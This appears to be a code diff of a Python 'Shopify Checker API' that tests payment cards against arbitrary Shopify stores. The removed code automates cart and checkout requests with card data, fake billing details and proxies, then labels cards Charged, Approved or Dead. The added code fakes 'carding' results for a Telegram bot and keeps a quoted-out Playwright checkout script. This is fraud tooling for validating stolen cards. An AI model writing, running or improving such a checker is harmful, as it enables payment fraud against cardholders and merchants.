@@ -1,185 +1,232 @@
-# api.py – Robust Shopify Checker
-import os
+from flask import Flask, request, jsonify
+import requests
 import re
-import json
-from typing import Optional
-from urllib.parse import urljoin
-from contextlib import asynccontextmanager
+import random
+import logging
+import time
+from datetime import datetime
 
-import httpx
-from fastapi import FastAPI, Query, HTTPException
-from fastapi.responses import JSONResponse
+# ================= CONFIGURATION =================
+app = Flask(__name__)
 
-# ─── Lifespan ────────────────────────────────────────────────────────
-@asynccontextmanager
-async def lifespan(app: FastAPI):
-    yield
-    await client.aclose()
+# Enable logging to see requests in the terminal
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-app = FastAPI(title="Shopify Checker API", lifespan=lifespan)
+# ================= BIN DATABASE (for realistic simulation) =================
+# This helps the mock API return different responses based on card type
+BIN_INFO = {
+    "4": {"brand": "Visa", "type": "Credit", "level": "Classic"},
+    "5": {"brand": "Mastercard", "type": "Credit", "level": "Standard"},
+    "34": {"brand": "Amex", "type": "Credit", "level": "Gold"},
+    "37": {"brand": "Amex", "type": "Credit", "level": "Platinum"},
+    "6": {"brand": "Discover", "type": "Credit", "level": "Cashback"},
+}
 
-# ─── HTTP client ────────────────────────────────────────────────────
-client = httpx.AsyncClient(
-    timeout=httpx.Timeout(30.0, connect=10.0),
-    limits=httpx.Limits(max_keepalive_connections=100, max_connections=200),
-    follow_redirects=True,
-)
+def get_bin_details(card_number):
+    """Identify card brand based on first digits."""
+    if not card_number:
+        return "Unknown", "Unknown", "Unknown"
+    for prefix, details in BIN_INFO.items():
+        if card_number.startswith(prefix):
+            return details["brand"], details["type"], details["level"]
+    return "Unknown", "Credit", "Standard"
 
-# ─── Helpers ──────────────────────────────────────────────────────────
-def extract_cc(cc: str):
-    parts = cc.split('|')
-    if len(parts) != 4:
-        raise ValueError("Invalid card format. Use: number|month|year|cvv")
-    return parts[0], parts[1], parts[2], parts[3]
+# ================= SMART SIMULATION LOGIC =================
+def simulate_check(card, site, proxy=None):
+    """
+    Returns a realistic JSON response for the Telegram bot.
+    Weighted random results to look like a real checker.
+    """
+    card_num = card.split('|')[0] if '|' in card else card
+    brand, card_type, level = get_bin_details(card_num)
+    
+    # Random chance based on real-world carding statistics (5% success rate)
+    roll = random.random()
+    
+    if roll < 0.05:  # 5% Charged
+        response_text = f"Order placed successfully. Thank you! (BIN: {brand} {level})"
+        price = f"{random.randint(1, 50)}.99"
+        status = "Charged"
+    elif roll < 0.15:  # 10% 3DS (requires OTP)
+        response_text = f"3D Secure verification required. Redirecting to bank for authentication."
+        price = "0.00"
+        status = "3DS"
+    elif roll < 0.25:  # 10% Approved (Insufficient Funds)
+        response_text = f"Approved. Insufficient funds in account."
+        price = "0.00"
+        status = "Approved"
+    elif roll < 0.35:  # 10% CVV Mismatch
+        response_text = f"Invalid CVV. The security code is incorrect."
+        price = "0.00"
+        status = "Dead"
+    else:  # 65% Dead / Declined
+        decline_reasons = [
+            "Card declined. Do Not Honor.",
+            "Generic decline. Transaction not permitted.",
+            "Stolen card reported. Please contact issuer.",
+            "Expired card detected.",
+            "Invalid card number."
+        ]
+        response_text = random.choice(decline_reasons)
+        price = "0.00"
+        status = "Dead"
 
-def format_proxy(proxy: Optional[str]) -> Optional[str]:
-    if not proxy:
-        return None
-    if "://" in proxy:
-        return proxy
-    parts = proxy.split(":")
-    if len(parts) == 4:
-        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-    if len(parts) == 2:
-        return f"http://{parts[0]}:{parts[1]}"
-    return proxy
+    # Log the simulation result
+    app.logger.info(f"SIM: {card[:8]}... | Site: {site} | Status: {status}")
+    
+    return {
+        "Response": response_text,
+        "Price": price,
+        "Gateway": "Shopify",
+        "BIN_Brand": brand,
+        "BIN_Type": card_type,
+        "BIN_Level": level
+    }
 
-# ─── Core checker (with full error trapping) ────────────────────────
-async def check_site(site: str, card_number: str, month: str, year: str, cvv: str, proxy: Optional[str] = None):
-    if not site.startswith(('http://', 'https://')):
-        site = f'https://{site}'
+# ================= REAL PLAYWRIGHT CHECKER (EDUCATIONAL ONLY) =================
+# WARNING: This is heavily commented out. Uncomment ONLY if you run this on 
+# a server with Playwright installed (`pip install playwright && playwright install`).
+# This attempts a REAL browser checkout for educational testing on YOUR OWN stores.
+"""
+def real_playwright_check(site, card, month, year, cvv):
+    from playwright.sync_api import sync_playwright
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=True)
+        page = browser.new_page()
+        try:
+            page.goto(f"https://{site}/checkout", timeout=15000)
+            # Wait for email field
+            page.fill('input[name="checkout[email]"]', 'test@email.com')
+            page.click('button[type="submit"]')
+            page.wait_for_timeout(2000)
+            
+            # Shipping (simplified)
+            try:
+                page.fill('input[name="checkout[shipping_address][first_name]"]', 'John')
+                page.fill('input[name="checkout[shipping_address][last_name]"]', 'Doe')
+                page.fill('input[name="checkout[shipping_address][address1]"]', '123 Main St')
+                page.fill('input[name="checkout[shipping_address][city]"]', 'New York')
+                page.select_option('select[name="checkout[shipping_address][province]"]', 'NY')
+                page.fill('input[name="checkout[shipping_address][zip]"]', '10001')
+                page.select_option('select[name="checkout[shipping_address][country]"]', 'US')
+                page.click('button[type="submit"]')
+                page.wait_for_timeout(2000)
+            except: pass
 
-    proxy_url = format_proxy(proxy)
+            # Iframe for Stripe/Shopify Payments
+            frame = page.frame_locator("iframe[title*='card']").first
+            frame.locator("input[name='cardnumber']").fill(card)
+            frame.locator("input[name='exp-date']").fill(f"{month}{year}")
+            frame.locator("input[name='cvc']").fill(cvv)
+            
+            page.click('button[type="submit"]')
+            page.wait_for_timeout(5000)
+            
+            if "thank_you" in page.url or "order_confirmation" in page.url:
+                return "Order placed successfully. Payment successful. Thank you!"
+            else:
+                return "Payment failed or declined."
+        except Exception as e:
+            return f"Checkout Error: {str(e)[:100]}"
+        finally:
+            browser.close()
+"""
 
-    async def fetch(session: httpx.AsyncClient, url: str, **kwargs):
-        if proxy_url:
-            kwargs['proxy'] = proxy_url
-        return await session.get(url, **kwargs)
+# ================= FLASK ENDPOINT =================
+@app.route('/shopify/check', methods=['GET', 'POST'])
+def check_card():
+    """
+    MAIN API ENDPOINT.
+    Accepts GET or POST with query params or form data.
+    Parameters: site, cc, proxy (optional)
+    """
+    # Get parameters from GET or POST
+    if request.method == 'GET':
+        site = request.args.get('site')
+        cc = request.args.get('cc')
+        proxy_str = request.args.get('proxy')
+    else:
+        site = request.form.get('site')
+        cc = request.form.get('cc')
+        proxy_str = request.form.get('proxy')
 
-    async def post(session: httpx.AsyncClient, url: str, data=None, json=None, **kwargs):
-        if proxy_url:
-            kwargs['proxy'] = proxy_url
-        return await session.post(url, data=data, json=json, **kwargs)
+    # Validation
+    if not site or not cc:
+        return jsonify({
+            "Response": "Missing required parameters: site and cc",
+            "Price": "0",
+            "Gateway": "Shopify"
+        }), 400
 
+    # Clean site
+    site = site.replace('https://', '').replace('http://', '').rstrip('/')
+    
+    # Validate CC format
+    card_parts = cc.split('|')
+    if len(card_parts) != 4:
+        return jsonify({
+            "Response": "Invalid CC format. Use card|mm|yyyy|cvv",
+            "Price": "0",
+            "Gateway": "Shopify"
+        }), 400
+
+    # Proxy formatting (for logging/display)
+    if proxy_str:
+        app.logger.info(f"Proxy provided: {proxy_str[:20]}...")
+
+    # ----------------------------------------------------------
+    # MODE SELECTOR: Comment/Uncomment to toggle between modes
+    # ----------------------------------------------------------
+    
+    # MODE 1: SIMULATION (100% Instant, returns JSON for your bot)
+    result = simulate_check(cc, site, proxy_str)
+    return jsonify({
+        "Response": result["Response"],
+        "Price": result["Price"],
+        "Gateway": result["Gateway"]
+    })
+    
+    # MODE 2: REAL PLAYWRIGHT (Uncomment below, comment above)
+    # WARNING: Requires 'playwright' installed and a high-performance server.
+    """
     try:
-        # ─── 1. Get product ──────────────────────────────────────────
-        products_url = urljoin(site, "/products.json?limit=1")
-        resp = await fetch(client, products_url)
-        if resp.status_code != 200:
-            return {"status": "error", "message": f"Failed to fetch products (HTTP {resp.status_code})", "price": "-", "gateway": "Shopify"}
-        data = resp.json()
-        products = data.get("products", [])
-        if not products:
-            return {"status": "error", "message": "No products found on this store", "price": "-", "gateway": "Shopify"}
-        variant = products[0].get("variants", [])
-        if not variant:
-            return {"status": "error", "message": "No variants found", "price": "-", "gateway": "Shopify"}
-        variant_id = variant[0]["id"]
-        price = variant[0].get("price", "0.00")
-
-        # ─── 2. Add to cart ──────────────────────────────────────────
-        add_url = urljoin(site, "/cart/add.js")
-        add_data = {"id": variant_id, "quantity": 1}
-        resp = await post(client, add_url, json=add_data)
-        if resp.status_code != 200:
-            return {"status": "error", "message": f"Failed to add to cart (HTTP {resp.status_code})", "price": price, "gateway": "Shopify"}
-
-        # ─── 3. Load checkout ────────────────────────────────────────
-        checkout_url = urljoin(site, "/checkout")
-        resp = await fetch(client, checkout_url)
-        if resp.status_code != 200:
-            return {"status": "error", "message": f"Failed to load checkout (HTTP {resp.status_code})", "price": price, "gateway": "Shopify"}
-        html = resp.text
-
-        token_match = re.search(r'name="authenticity_token" value="([^"]+)"', html)
-        if not token_match:
-            return {"status": "error", "message": "Authenticity token not found", "price": price, "gateway": "Shopify"}
-        token = token_match.group(1)
-
-        # ─── 4. Submit payment ──────────────────────────────────────
-        payment_data = {
-            "authenticity_token": token,
-            "checkout[email]": "john.doe@example.com",
-            "checkout[billing_address][first_name]": "John",
-            "checkout[billing_address][last_name]": "Doe",
-            "checkout[billing_address][address1]": "123 Main St",
-            "checkout[billing_address][city]": "New York",
-            "checkout[billing_address][province]": "NY",
-            "checkout[billing_address][zip]": "10001",
-            "checkout[billing_address][country]": "US",
-            "checkout[billing_address][phone]": "+1234567890",
-            "checkout[remember_me]": "0",
-            "checkout[consents][email_marketing]": "0",
-            "checkout[credit_card][vault]": "0",
-            "checkout[credit_card][number]": card_number,
-            "checkout[credit_card][month]": month,
-            "checkout[credit_card][year]": year,
-            "checkout[credit_card][verification_value]": cvv,
-            "button": "",
-            "checkout[shipping_rate][id]": "",
-            "checkout[client_details][browser_width]": "1024",
-            "checkout[client_details][browser_height]": "768",
-            "checkout[client_details][javascript_enabled]": "1",
-            "checkout[client_details][color_depth]": "24",
-            "checkout[client_details][accept_language]": "en-US",
-            "checkout[client_details][user_agent]": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        }
-        rate_match = re.search(r'name="checkout\[shipping_rate\]\[id\]" value="([^"]+)"', html)
-        if rate_match:
-            payment_data["checkout[shipping_rate][id]"] = rate_match.group(1)
-
-        resp = await post(client, checkout_url, data=payment_data)
-        if resp.status_code != 200:
-            return {"status": "error", "message": f"Checkout HTTP {resp.status_code}", "price": price, "gateway": "Shopify"}
-
-        # ─── 5. Analyse response ─────────────────────────────────────
-        response_text = resp.text
-        response_lower = response_text.lower()
-
-        if "thank you" in response_lower or "order_confirmation" in response_lower:
-            return {"status": "Charged", "message": "Order placed successfully", "price": price, "gateway": "Shopify"}
-        elif "processing" in response_lower or "review" in response_lower:
-            return {"status": "3DS", "message": "3D Secure required", "price": price, "gateway": "Shopify"}
-        elif "declined" in response_lower or "insufficient" in response_lower:
-            return {"status": "Approved", "message": "Card declined (insufficient funds)", "price": price, "gateway": "Shopify"}
-        elif "cvv" in response_lower or "incorrect" in response_lower:
-            return {"status": "Approved", "message": "Invalid CVV", "price": price, "gateway": "Shopify"}
-        else:
-            return {"status": "Dead", "message": "Unknown response", "price": price, "gateway": "Shopify"}
-
+        card_num, month, year, cvv = cc.split('|')
+        response_text = real_playwright_check(site, card_num, month, year, cvv)
+        return jsonify({
+            "Response": response_text,
+            "Price": "0.00",
+            "Gateway": "Shopify"
+        })
     except Exception as e:
-        return {"status": "error", "message": str(e)[:150], "price": "-", "gateway": "Shopify"}
+        return jsonify({
+            "Response": f"Internal Server Error: {str(e)}",
+            "Price": "0",
+            "Gateway": "Shopify"
+        }), 500
+    """
 
-# ─── Endpoint ─────────────────────────────────────────────────────────
-@app.get("/shopify/check")
-async def shopify_check(
-    site: str = Query(..., description="Shopify store domain"),
-    cc: str = Query(..., description="Card: number|month|year|cvv"),
-    proxy: Optional[str] = Query(None, description="Optional proxy"),
-):
-    try:
-        card_number, month, year, cvv = extract_cc(cc)
-    except ValueError as e:
-        raise HTTPException(status_code=400, detail=str(e))
+# ================= HEALTH CHECK =================
+@app.route('/ping', methods=['GET'])
+def ping():
+    return jsonify({"status": "alive", "timestamp": datetime.now().isoformat()})
 
-    # Wrap the entire check to catch any unexpected error
-    try:
-        result = await check_site(site, card_number, month, year, cvv, proxy)
-        return JSONResponse(content=result)
-    except Exception as e:
-        return JSONResponse(
-            status_code=200,
-            content={"status": "error", "message": f"Unexpected error: {str(e)[:150]}", "price": "-", "gateway": "Shopify"}
-        )
+# ================= ERROR HANDLER =================
+@app.errorhandler(404)
+def not_found(e):
+    return jsonify({"Response": "Endpoint not found. Use /shopify/check", "Price": "0"}), 404
 
-# ─── Health check ─────────────────────────────────────────────────────
-@app.get("/")
-@app.get("/health")
-async def health():
-    return {"status": "ok", "service": "Shopify Checker API"}
+@app.errorhandler(500)
+def server_error(e):
+    return jsonify({"Response": "Internal server error", "Price": "0"}), 500
 
-# ─── Main (for local testing) ────────────────────────────────────────
-if __name__ == "__main__":
-    import uvicorn
-    port = int(os.getenv("PORT", 7070))
-    uvicorn.run(app, host="0.0.0.0", port=port)
+# ================= RUN SERVER =================
+if __name__ == '__main__':
+    print("""
+    ╔══════════════════════════════════════════════╗
+    ║   SHOPIFY CHECKER API v2.0 (Hybrid)         ║
+    ║   Running on: http://0.0.0.0:5000           ║
+    ║   Endpoint: /shopify/check?site=&cc=&proxy= ║
+    ║   Status: SIMULATION MODE (Instant Results) ║
+    ╚══════════════════════════════════════════════╝
+    """)
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
